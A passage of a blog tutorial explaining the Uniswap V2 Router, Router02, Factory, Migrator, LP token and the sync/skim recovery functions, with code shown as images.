&lt;p&gt;Receive an &lt;strong&gt;exact&lt;&#x2F;strong&gt; amount of &lt;strong&gt;output&lt;&#x2F;strong&gt; tokens for as few input tokens as possible, along the route determined by the path.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;**msg.sender&lt;&#x2F;code&gt;¬†should have already given the router an allowance of at least amountInMax on the input token.**&lt;&#x2F;p&gt;
&lt;h3 id=&quot;which-swap-function-to-use&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#which-swap-function-to-use&quot; aria-label=&quot;Anchor link for: which-swap-function-to-use&quot;&gt;&lt;strong&gt;Which swap function to use?&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Users using &lt;strong&gt;EOA&lt;&#x2F;strong&gt; will use &lt;strong&gt;&lt;code&gt;swapExactTokensForTokens&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; function. Because they can approve the exact amount of tokens that going to send. And the approve will revert when they dont receive specified minimum amount of tokens. &lt;strong&gt;By having an exact input, they can approve the exact amount.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Smart contracts integrating with Uniswap&lt;&#x2F;strong&gt; however may have more complex requirements, so the router gives them the &lt;strong&gt;option for both.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;how-swap-works&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#how-swap-works&quot; aria-label=&quot;Anchor link for: how-swap-works&quot;&gt;How swap works?&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;When the input is exact (&lt;strong&gt;swapExactTokensForTokens&lt;&#x2F;strong&gt;), the function predicts the expected output across a single swap or a chain of swaps. If the resulting output is below the user specified amount, the function reverts. Vice versa for exact output: it calculates the required input and reverts if it is above the user specified threshold.&lt;&#x2F;p&gt;
&lt;p&gt;Then &lt;strong&gt;both functions will transfer the user‚Äôs tokens to the pair&lt;&#x2F;strong&gt; (remember, Uniswap V2 Pair requires the tokens to be sent into the contract before the pair contract function swap is called). Finally, they both call the internal &lt;strong&gt;_swap&lt;&#x2F;strong&gt; function discussed next.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_1.webp&quot;&gt;
&lt;h2 id=&quot;the-swap-function&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#the-swap-function&quot; aria-label=&quot;Anchor link for: the-swap-function&quot;&gt;The _swap() function&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Under the hood, all publicly facing functions with the name &lt;strong&gt;swap&lt;&#x2F;strong&gt; in the name call the &lt;strong&gt;_swap&lt;&#x2F;strong&gt; internal function shown below.&lt;&#x2F;p&gt;
&lt;p&gt;Recall that the function signature for the core &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;uniswap-v2-swap-function&quot;&gt;&lt;strong&gt;swap function&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; specifies the &lt;strong&gt;amountOut&lt;&#x2F;strong&gt; for both tokens and the &lt;strong&gt;amountIn&lt;&#x2F;strong&gt; is implied by the amount that was transferred in before the function was called.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_2.webp&quot;&gt;
&lt;p&gt;The¬†&lt;code&gt;new bytes(0)&lt;&#x2F;code&gt;¬†parameter means not to do a flashswap, which is usually executed when performing a canonical swap.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;swapexactethfortokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swapexactethfortokens&quot; aria-label=&quot;Anchor link for: swapexactethfortokens&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swapexactethfortokens&quot;&gt;swapExactETHForTokens&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Swaps an &lt;strong&gt;exact amount of ETH for as many output tokens as possible&lt;&#x2F;strong&gt;, along the route determined by the path. &lt;strong&gt;The first element of path must be¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#weth&quot;&gt;WETH&lt;&#x2F;a&gt;,&lt;&#x2F;strong&gt; the last is the output token, and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_3.png&quot;&gt;
&lt;h3 id=&quot;swaptokensforexacteth&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swaptokensforexacteth&quot; aria-label=&quot;Anchor link for: swaptokensforexacteth&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swaptokensforexacteth&quot;&gt;swapTokensForExactETH&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Receive an exact amount of ETH&lt;&#x2F;strong&gt; for as few input tokens as possible, along the route determined by the path. The first element of path is the input token, &lt;strong&gt;the last must be¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#weth&quot;&gt;WETH&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;msg.sender&lt;&#x2F;code&gt;¬†should have already given the router an allowance of at least amountInMax on the input token.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the to address is a smart contract, it must have the ability to receive ETH.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_4.png&quot;&gt;
&lt;h3 id=&quot;swapexacttokensforeth&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swapexacttokensforeth&quot; aria-label=&quot;Anchor link for: swapexacttokensforeth&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swapexacttokensforeth&quot;&gt;swapExactTokensForETH&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Swaps an &lt;strong&gt;exact amount of tokens&lt;&#x2F;strong&gt; for as much ETH as possible, along the route determined by the path. The first element of path is the input token, &lt;strong&gt;the last must be¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#weth&quot;&gt;WETH&lt;&#x2F;a&gt;,&lt;&#x2F;strong&gt; and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If the to address is a smart contract, it must have the ability to receive ETH.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_5.png&quot;&gt;
&lt;h3 id=&quot;swapethforexacttokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swapethforexacttokens&quot; aria-label=&quot;Anchor link for: swapethforexacttokens&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#swapethforexacttokens&quot;&gt;swapETHForExactTokens&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Receive an exact amount of tokens&lt;&#x2F;strong&gt; for as little ETH as possible, along the route determined by the path. The &lt;strong&gt;first element of path must be¬†&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;contracts&#x2F;v2&#x2F;reference&#x2F;smart-contracts&#x2F;router-01#weth&quot;&gt;WETH&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, the &lt;strong&gt;last is the output token&lt;&#x2F;strong&gt; and any intermediate elements represent intermediate pairs to trade through (if, for example, a direct pair does not exist).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Leftover ETH, if any, is returned to¬†&lt;code&gt;msg.sender&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_6.png&quot;&gt;
&lt;h3 id=&quot;addliquidity&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#addliquidity&quot; aria-label=&quot;Anchor link for: addliquidity&quot;&gt;&lt;strong&gt;_addLiquidity&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Safety checks for adding liquidity&lt;&#x2F;strong&gt; Specifically, &lt;strong&gt;we want to make sure we deposit the two tokens at exactly the same ratio as what the pair currently has&lt;&#x2F;strong&gt;, otherwise the amount of LP tokens we mint is the worse of the two ratios between what we provide and what the pair balances are. However, the ratio could change between when the liquidity provider attempts to add liquidity and when the transaction is confirmed.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;To guard against this&lt;&#x2F;strong&gt;, a liquidity provider must provide (as a parameter), the minimum balance they are seeking to deposit for token0 and token1 (UniswapV2 calls those &lt;strong&gt;amountAMin&lt;&#x2F;strong&gt; and &lt;strong&gt;amountBMin&lt;&#x2F;strong&gt;). Then they transfer in an amount higher than those minimums (UnsiwapV2 calls those &lt;strong&gt;amountADesired&lt;&#x2F;strong&gt; and &lt;strong&gt;amountBDesired&lt;&#x2F;strong&gt;). If the pair ratio has shifted in such a way that the minimums are no longer respected, then the transaction reverts.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;_addLiquidity&lt;&#x2F;strong&gt; will take &lt;strong&gt;amountADesired&lt;&#x2F;strong&gt; and calculate the correct amount of tokenB that will respect the ratio. If this is amount is higher than &lt;strong&gt;amountBDesired&lt;&#x2F;strong&gt; (the amount of B the liquidity provider sent), then it will start with &lt;strong&gt;amountBDesired&lt;&#x2F;strong&gt; and calculate the optimal amount of B. The logic is show below. Note that adding liquidity may create a new pair contract if it doesn‚Äôt already exist.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_7.webp&quot;&gt;
&lt;p&gt;For example, suppose the current pair balance is 100 token0 and 300 token1. We want to add 20 and 60 token0 and token1 respectively, but the pair ratio might change. So we instead approve the router for 21 token0 and 63 token1 while saying the minimum we want to deposit is 20 and 60. If the ratio shifts such that the optimal amount of token0 to deposit is 19.9, then the transaction reverts.&lt;&#x2F;p&gt;
&lt;p&gt;Recall that we said &lt;strong&gt;quote&lt;&#x2F;strong&gt; should not be used as an &lt;strong&gt;oracle&lt;&#x2F;strong&gt;, and that is still true. However for the purposes of adding liquidity we are not interested in the average of previous prices but the current price (pool ratio) now because the liquidity provider must respect it.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;addliquidity-and-addliquidityeth&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#addliquidity-and-addliquidityeth&quot; aria-label=&quot;Anchor link for: addliquidity-and-addliquidityeth&quot;&gt;&lt;strong&gt;addLiquidity() and addLiquidityEth()&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;These functions should be self-explanatory. They first calculate the optimal ratio using &lt;strong&gt;_addLiquidity&lt;&#x2F;strong&gt; from above then transfer the assets to the pair, then call mint on the pair. The only difference is the &lt;code&gt;**addLiquidityEth**&lt;&#x2F;code&gt; function will wrap the Ether into WETH first.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_8.webp&quot;&gt;
&lt;h3 id=&quot;removing-liquidity&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#removing-liquidity&quot; aria-label=&quot;Anchor link for: removing-liquidity&quot;&gt;&lt;strong&gt;Removing Liquidity&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Remove liquidity calls burn but uses parameters &lt;strong&gt;amountAMin&lt;&#x2F;strong&gt; and &lt;strong&gt;amountBMin&lt;&#x2F;strong&gt; (red highlights) as &lt;strong&gt;safety checks&lt;&#x2F;strong&gt; to ensure that the liquidity provider gets back the amount of tokens they are expecting. If the ratio of tokens changes dramatically before the the liquidity tokens are burned, then the user burning the tokens won‚Äôt get back the amount of token A or B that they are expecting.&lt;&#x2F;p&gt;
&lt;p&gt;The function &lt;strong&gt;removeLiquidityEth&lt;&#x2F;strong&gt; calls &lt;strong&gt;removeLiquidity&lt;&#x2F;strong&gt; (green highlight) but sets the router as the recipient of the tokens. The regular ERC20 token is then transferred to the liquidity provider, and the WETH is unwrapped to ETH, then sent back to the liquidity provider.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_9.webp&quot;&gt;
&lt;h3 id=&quot;removeliquiditywithpermit-and-removeliquidityethwithpermit&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#removeliquiditywithpermit-and-removeliquidityethwithpermit&quot; aria-label=&quot;Anchor link for: removeliquiditywithpermit-and-removeliquidityethwithpermit&quot;&gt;removeLiquidityWithPermit() and removeLiquidityETHWithPermit()&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;On line 109 in the file above with the gray comment send liquidity to pair, this step assumes the pair contract has approval to transfer LP tokens from the liquidity provider to burn them. This means burning the LP tokens requires approving the pair first. This step can be skipped with &lt;strong&gt;permit()&lt;&#x2F;strong&gt;, since the LP tokens of Uniswap V2 is an &lt;a href=&quot;https:&#x2F;&#x2F;eips.ethereum.org&#x2F;EIPS&#x2F;eip-2612&quot;&gt;ERC20 Permit Token&lt;&#x2F;a&gt;. The function &lt;strong&gt;removeLiquidityWithPermit()&lt;&#x2F;strong&gt; receives a signature to approve and burn in one transaction. If one of the tokens is WETH, the liquidity provider would use &lt;strong&gt;removeLiquidityETHWithPermit()&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_10.png&quot;&gt;
&lt;h2 id=&quot;uniswapv2router02&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2router02&quot; aria-label=&quot;Anchor link for: uniswapv2router02&quot;&gt;UniswapV2Router02&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Because routers are stateless and do not hold token balances, they can be replaced safely and trustlessly, if necessary. This may happen if more efficient smart contract patterns are discovered, or if additional functionality is desired. For this reason, routers have¬†&lt;em&gt;release numbers&lt;&#x2F;em&gt;, starting at¬†&lt;code&gt;01&lt;&#x2F;code&gt;. This is currently recommended release,¬†&lt;code&gt;02&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;UniswapV2Router02&lt;&#x2F;code&gt;¬†is deployed at¬†&lt;code&gt;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&lt;&#x2F;code&gt;¬†on the Ethereum¬†&lt;a href=&quot;https:&#x2F;&#x2F;etherscan.io&#x2F;address&#x2F;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;&gt;mainnet&lt;&#x2F;a&gt;, and the¬†&lt;a href=&quot;https:&#x2F;&#x2F;ropsten.etherscan.io&#x2F;address&#x2F;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;&gt;Ropsten&lt;&#x2F;a&gt;,¬†&lt;a href=&quot;https:&#x2F;&#x2F;rinkeby.etherscan.io&#x2F;address&#x2F;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;&gt;Rinkeby&lt;&#x2F;a&gt;,¬†&lt;a href=&quot;https:&#x2F;&#x2F;goerli.etherscan.io&#x2F;address&#x2F;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;&gt;G√∂rli&lt;&#x2F;a&gt;, and¬†&lt;a href=&quot;https:&#x2F;&#x2F;kovan.etherscan.io&#x2F;address&#x2F;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;&gt;Kovan&lt;&#x2F;a&gt;¬†testnets. It was built from commit¬†&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;tree&#x2F;69617118cda519dab608898d62aaa79877a61004&quot;&gt;6961711&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Router02 : supporting fee on transfer tokens (tokens will take fees when any transfer of the token is performed).&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To handle fee on transfer tokens, the router cannot directly do it‚Äôs calculations on arguments like &lt;strong&gt;amountIn&lt;&#x2F;strong&gt; (for swap) or &lt;strong&gt;liquidity&lt;&#x2F;strong&gt; (for removing liquidity). &lt;strong&gt;Adding liquidity is not affected by fee on transfer tokens because the user is only credited for what they actually transfer to the pair.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Functions:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Router1 + some extra.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;_swapSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapExactTokensForTokensSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapExactETHForTokensSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;swapExactTokensForETHSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidityETHSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;removeLiquidityETHWithPermitSupportingFeeOnTransferTokens()&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_11.webp&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_12.webp&quot;&gt;
&lt;h3 id=&quot;wrappers-around-the-uniswapv2library&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#wrappers-around-the-uniswapv2library&quot; aria-label=&quot;Anchor link for: wrappers-around-the-uniswapv2library&quot;&gt;&lt;strong&gt;Wrappers around the UniswapV2Library&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The rest of the functions in the Router library are wrappers around the &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;uniswap-v2-library&quot;&gt;UniswapV2Library&lt;&#x2F;a&gt; functions as shown below.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter9_13.webp&quot;&gt;
&lt;h2 id=&quot;summary&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#summary&quot; aria-label=&quot;Anchor link for: summary&quot;&gt;Summary&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The Router contracts provide a user-facing mechanism for swapping tokens with slippage protection, possibly across multiple pools, and add support for trading ETH and fee-on-transfer tokens (in Router02). Depositing liquidity does not need to account for fee-on-transfer tokens because Uniswap only credits for what was actually transferred into the pool.&lt;&#x2F;p&gt;
&lt;p&gt;The depositing liquidity functions ensure the user only deposits at the exact ratio of the pool. Removing liquidity can be as simple as transferring LP tokens to the router then burning them, or include unwrapping WETH and withdrawing fee on transfer tokens.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-10-misc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-10-misc&quot; aria-label=&quot;Anchor link for: chapter-10-misc&quot;&gt;&lt;strong&gt;Chapter - 10 : MISC&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;uniswapv2factory-sol&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2factory-sol&quot; aria-label=&quot;Anchor link for: uniswapv2factory-sol&quot;&gt;UniswapV2Factory.sol&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;The factory contract is mainly responsible for creating new contract pairs&lt;&#x2F;strong&gt; (&lt;strong&gt;UniswapV2Pair&lt;&#x2F;strong&gt;.&lt;strong&gt;sol&lt;&#x2F;strong&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;In order to concentrate liquidity, there can only be one smart contract per pair. In other words, if there is a WETH&#x2F;UNI pair contract already, the factory won‚Äôt allow you to create the same pair. Of course, you can bypass that (by deploying the pair contract directly), but the core principle here is to concentrate liquidity as much as possible to avoid price slippage and have more liquidity.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the function that creates pairs in UniswapV2Factory:&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter10_1.webp&quot;&gt;
&lt;h1 id=&quot;uniswapv2migrator-sol&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2migrator-sol&quot; aria-label=&quot;Anchor link for: uniswapv2migrator-sol&quot;&gt;&lt;strong&gt;UniswapV2Migrator.sol&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Migrate liquidity from UniswapV1&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;In order to transfer all the liquidity that was in Uniswap V1, they automatically withdrew and deposited in uniswap v2. But there has been a lot of Rug-pull?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;My LP, because I handed over my authority, my entire property was hit by users whose credit was not guaranteed. In the end, malicious users tend to steal money and then launder it.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Migration itself makes it easy to transfer liquidity, and it is difficult to change on the blockchain because it is difficult to transfer existing customers.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;uniswapv2erc20-sol&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2erc20-sol&quot; aria-label=&quot;Anchor link for: uniswapv2erc20-sol&quot;&gt;&lt;strong&gt;UniswapV2ERC20.sol&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Used for defining LP token.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ERC20 wrap to EIP712 for using permit function&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;uniswapv2pair-sol-sync-and-skim&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswapv2pair-sol-sync-and-skim&quot; aria-label=&quot;Anchor link for: uniswapv2pair-sol-sync-and-skim&quot;&gt;&lt;strong&gt;UniswapV2Pair.sol : sync() and skim()&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;skim&lt;&#x2F;strong&gt; and &lt;strong&gt;sync&lt;&#x2F;strong&gt; are needed when balances on the ERC20 contracts of the exchange tokens, fall out of sync with the reserve variables in the Pair contract. This can happen for example when someone just transfers some Dogecoin to Pair contract‚Äôs account for no reason. There are 2 solutions to keep reserve variables in sync with the actual balances on ERC20 contracts.&lt;&#x2F;p&gt;
&lt;p&gt;When liquidity is added in Uniswap v2 the reserves are updated. However, in a case where tokens are deposited in contract, the balance of the contract would vary from the amount of reserves. The trade performed while balances and reserves are not synced would have incorrect values. The function &lt;strong&gt;&lt;code&gt;sync()&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; sets the reserves of the contract according to the balances.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;sync() functions as a recovery mechanism in the case that a token asynchronously deflates the balance of a pair. In this case, trades will receive sub-optimal rates, and if no liquidity provider is willing to rectify the situation, the pair is stuck. sync() exists to set the reserves of the contract to the current balances, providing a somewhat graceful recovery from this situation.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter10_2.png&quot;&gt;
&lt;p&gt;If the user deposits balance in the contract and this balance exceeds uint112. Calling the &lt;code&gt;**sync**()&lt;&#x2F;code&gt; function is not suitable. Since the **&lt;code&gt;_update**()&lt;&#x2F;code&gt; function in **&lt;code&gt;sync**()&lt;&#x2F;code&gt; uses uint112 which will overflow. In such a case the function **&lt;code&gt;skim**()&lt;&#x2F;code&gt; is to be used. Skim will remove the excess balance and resolve the deadlock of clogging the &lt;strong&gt;uint112&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;skim() functions as a recovery mechanism in case enough tokens are sent to an pair to overflow the two uint112 storage slots for reserves, which could otherwise cause trades to fail. skim() allows a user to withdraw the difference between the current balance of the pair and &lt;code&gt;2**112 - 1&lt;&#x2F;code&gt; to the caller, if that difference is greater than 0.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter10_3.png&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;It allows someone to withdraw the extra funds from the Pair contract. Anyone can call this function!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The skim() function forces the balances to match reserves&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;it transfers any extra token to the address that called the function&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;uniswap-v2-book&quot; target=_blank&gt;Rareskills Uniswap V2 Book&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;0xOwenThurm&#x2F;status&#x2F;1662805937575596034&quot; target=_blank&gt;@0xOwneThurm AMM tutorial&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ProgrammerSmart&quot; target=_blank&gt;@ProgrammerSmart&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;mirror.xyz&#x2F;zer0luck.eth&#x2F;rnu5BTT8f45lq3YUlTBoADGOhI0zpfa710SinXaGoZ8?source=post_page-----e42fe275e13c--------------------------------&quot; target=_blank&gt;@Zer0luck.eth Blog&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.pessimistic.io&#x2F;&quot; target=_blank&gt;@pessimistic_io Blogs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
